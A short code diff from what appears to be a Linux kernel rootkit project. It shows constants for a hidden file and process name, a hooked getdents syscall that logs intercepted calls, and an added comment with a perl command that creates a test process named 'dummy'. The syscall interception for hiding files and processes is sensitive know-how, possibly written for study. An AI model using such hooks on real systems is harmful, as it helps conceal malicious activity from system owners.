@@ -106,6 +106,7 @@ char * get_cmdline_path(char * buf, char * pid) {
 
 #define HIDE_FILE "secret"
 #define HIDE_PROCESS "dummy"
+// You can create a dummy process with this command: perl  -MPOSIX -e '$0="dummy"; pause' &
 
 asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp, unsigned int count) {
 	pr_info("FAKEGETDENTS: Intercepted getdents of fd=%d %p %d\n", fd, dirp, count);
